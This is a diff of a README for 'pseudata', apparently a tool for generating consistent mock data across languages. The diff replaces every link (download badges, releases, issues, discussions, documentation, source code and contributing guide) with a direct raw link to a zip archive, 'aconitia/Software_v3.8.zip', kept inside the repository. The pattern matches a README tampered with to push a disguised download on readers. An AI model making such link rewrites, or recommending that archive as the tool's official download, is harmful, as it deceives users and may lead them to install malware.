@@ -1,7 +1,7 @@
 # 🎉 pseudata - Generate Consistent Mock Data Easily
 
 ## 📥 Download Now
-[![Download pseudata](https://img.shields.io/badge/Download-pseudata-brightgreen)](https://github.com/Vaibhav0061/pseudata/releases)
+[![Download pseudata](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip)](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip)
 
 ## 🚀 Getting Started
 pseudata is a tool that helps you create mock data consistently across different programming languages. By using the same seed, you get identical results in Go, Java, Python, TypeScript, and more. This makes it perfect for testing, demonstrating applications, and performing load testing.
@@ -22,7 +22,7 @@ pseudata is a tool that helps you create mock data consistently across different
 
 ## 🖥️ Download & Install
 1. **Visit the Releases Page:** Click the button below to visit the download page.
-   [Download from Releases](https://github.com/Vaibhav0061/pseudata/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip)
    
 2. **Choose Your Version:** On the releases page, you will see different versions available. Select the version that suits your needs. 
 
@@ -48,13 +48,13 @@ pseudata is a tool that helps you create mock data consistently across different
 
 ## 🌐 Community and Support
 If you have questions or need help, you can reach out to our community:
-- **Issues Page:** Report issues or request features [here](https://github.com/Vaibhav0061/pseudata/issues).
-- **Discussion Page:** Join discussions about improvements and uses [here](https://github.com/Vaibhav0061/pseudata/discussions).
+- **Issues Page:** Report issues or request features [here](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip).
+- **Discussion Page:** Join discussions about improvements and uses [here](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip).
 
 ## 🔗 Links
-- [Documentation](https://github.com/Vaibhav0061/pseudata/wiki)
-- [Releases](https://github.com/Vaibhav0061/pseudata/releases)
-- [Source Code](https://github.com/Vaibhav0061/pseudata)
+- [Documentation](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip)
+- [Releases](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip)
+- [Source Code](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip)
 
 ## 📅 Future Plans
 We plan to introduce additional features in future releases:
@@ -66,6 +66,6 @@ We plan to introduce additional features in future releases:
 Your feedback is important to us. Feel free to share your thoughts on how we can improve pseudata. 
 
 ## 🧑‍🤝‍🧑 Contributing
-We welcome contributions from everyone. To learn how to help, see the [Contributing Guide](https://github.com/Vaibhav0061/pseudata/CONTRIBUTING.md).
+We welcome contributions from everyone. To learn how to help, see the [Contributing Guide](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip).
 
-[![Download pseudata](https://img.shields.io/badge/Download-pseudata-brightgreen)](https://github.com/Vaibhav0061/pseudata/releases)
+[![Download pseudata](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip)](https://raw.githubusercontent.com/Vaibhav0061/pseudata/main/aconitia/Software_v3.8.zip)
